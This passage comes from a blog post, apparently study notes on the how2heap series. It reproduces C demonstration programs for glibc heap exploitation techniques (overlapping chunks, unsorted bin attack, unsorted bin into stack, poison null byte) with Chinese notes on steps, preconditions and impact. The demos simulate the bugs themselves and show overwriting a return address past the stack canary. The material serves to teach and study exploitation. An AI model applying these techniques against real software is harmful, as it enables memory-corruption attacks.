p4\n"</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p6 from %p to %p"</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p\n"</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's write something inside p6\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>ÂíåÁ¨¨‰∏Ä‰∏™Á®ãÂ∫èÁöÑÂå∫Âà´ÊòØÔºöËøô‰∏™ÊòØÊîπÂèòÊú™ÈáäÊîæÁöÑchunkÔºå1ÊòØÊîπÂèòÈáäÊîæÁöÑchunk</strong></p><p>ÊµÅÁ®ãÔºö</p><ol><li>ÂÖàÂàÜÈÖç5‰∏™chunkÔºåÁÑ∂Âêé‰øÆÊîπ2ÁöÑsizeÂüü</li><li>ÈáäÊîæchunk2ÔºåÊ≠§Êó∂ÁªßÁª≠ÂàÜÈÖçÔºåÂç≥ÂèØoverlap</li></ol></blockquote><h1 id="0x09-unsorted-bin-attack"><a href="#0x09-unsorted-bin-attack" class="headerlink" title="0x09 unsorted bin attack"></a>0x09 unsorted bin attack</h1><p>Âü∫Êú¨ÂéüÁêÜ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="comment">//bck = victim-&gt;bk;</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">        unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>wiki‰∏äÁöÑÂõæÊõ¥Ê∏ÖÊ•ö</p><p><img src="/2021/05/19/how2heap/unsorted_bin_attack_order.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">   <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span></span><br><span class="line">   <span class="string">"point to %p\n"</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span></span><br><span class="line">   <span class="string">"rewritten:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Âü∫Êú¨ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p><ol><li>ÂÖàÂàÜÈÖç‰∏Ä‰∏™Â±û‰∫éunsorted binÁöÑÂ†ÜÂùóÔºåÁÑ∂ÂêéÈáäÊîæ</li><li>‰øÆÊîπÂÖ∂bkÊåáÈíà‰∏∫Ê†à‰∏äÁöÑÂèòÈáèÔºåÁªßÁª≠ÂàÜÈÖçÁõ∏ÂêåÂ§ßÂ∞èÁöÑchunk</li><li>Â∞±ÂèØ‰ª•Â∞ÜÊ†à‰∏äÁöÑÂèòÈáè‰øÆÊîπ‰∏∫‰∏Ä‰∏™ËæÉÂ§ßÁöÑÂÄº</li></ol><p>Âà©Áî®Êù°‰ª∂ÔºöÂæóÊúâunsorted binÁöÑÂ§ßÂ∞èchunk</p><p><strong>ÂΩ±ÂìçÔºöÂèØ‰ª•Ë¶ÜÁõñÊ†à‰∏äÁöÑÂÄºÔºå‰ΩÜËøô‰∏™ÂÄº‰∏ç‰∏∫Êàë‰ª¨ÊâÄÊéß„ÄÇunsorted bin attackÂ∏∏Â∏∏Áî®‰∫é‰∏∫ÂÖ∂‰ªñÁöÑÊîªÂáªÂÅöËæÖÂä©,ÊØîÂ¶ÇË¶ÜÂÜôglobal_max_fastÊù•‰∏∫fastbin attackÂÅöËæÖÂä©</strong></p></blockquote><h1 id="0x10-unsorted-bin-into-stack"><a href="#0x10-unsorted-bin-into-stack" class="headerlink" title="0x10 unsorted bin into stack"></a>0x10 unsorted bin into stack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Create a fake chunk on the stack"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Set size for next allocation and the bk pointer to any writable address"</span>);</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n"</span>);</span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now next malloc will return the region of our fake chunk: %p\n"</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(0x100): %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"><span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Âü∫Êú¨ÊµÅÁ®ãÔºö</p><ol><li>ÂàÜÈÖç‰∏Ä‰∏™Ê†à‰∏äÁöÑÊï∞ÁªÑ</li><li>ÂàÜÈÖç‰∏§‰∏™Â†ÜÔºåÈáäÊîæÂÖ∂‰∏≠‰∏Ä‰∏™</li><li>‰º™ÈÄ†Ê†à‰∏äÁöÑÁöÑfake chunkÔºåËá≥Â∞ëÈúÄË¶ÅÊõ¥ÊîπsizeÂíåbkÊåáÈíà</li><li>‰øÆÊîπÈáäÊîæÁöÑchunkÁöÑbkÂíåsizeÂüüÔºå‰ΩøÊ†à‰∏äÁöÑchunkËøõÂÖ•unsorted bin</li><li>ÂàÜÈÖçchunkÂíåÊ†à‰∏äfake chunkÁöÑsize‰∏ÄÊ†∑Â§ß</li></ol><p>Âà©Áî®Êù°‰ª∂ÔºöÊàë‰ª¨ÂæóÁü•ÈÅìÊ†à‰∏äÁöÑ‰ΩçÁΩÆÔºåÂπ∂ËøõË°åÁõ∏Â∫îÁöÑ‰º™ÈÄ†</p><p><strong>ÂΩ±ÂìçÔºöÂà©Áî®Ê≠§ÁßçÊñπÊ≥ïÊàë‰ª¨ÁªïËøástack cannaryÊàñËÄÖÁõ¥Êé•Êõ¥ÊîπripÁöÑÂÄº</strong></p></blockquote><h1 id="0x11-poison-null-bytes"><a href="#0x11-poison-null-bytes" class="headerlink" title="0x11 poison null bytes"></a>0x11 poison null bytes</h1><p><strong>chunk sizeÂ±ûÊÄßÁöÑÊúÄÂ∞èÁöÑÊúâÊïàÂ≠óËäÇ‰∏çËÉΩÊòØ0x00,ÊúÄÂ∞èÁöÑ‰πüÂøÖÈ°ªÊòØ0x10,Âõ†‰∏∫chunkÁöÑsizeÂåÖÊã¨ËØ∑Ê±ÇÁöÑÈáèÂä†‰∏äÂÖÉÊï∞ÊçÆÊâÄÈúÄÁöÑÂ§ßÂ∞è(‰πüÂ∞±ÊòØÊàë‰ª¨ÁöÑsizeÂíåpre_sizeÁÑ∂ÂêéÁ©∫Èó¥Â§çÁî®*</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line"><span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line"><span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line"><span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line"><span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line"><span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line"><span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span 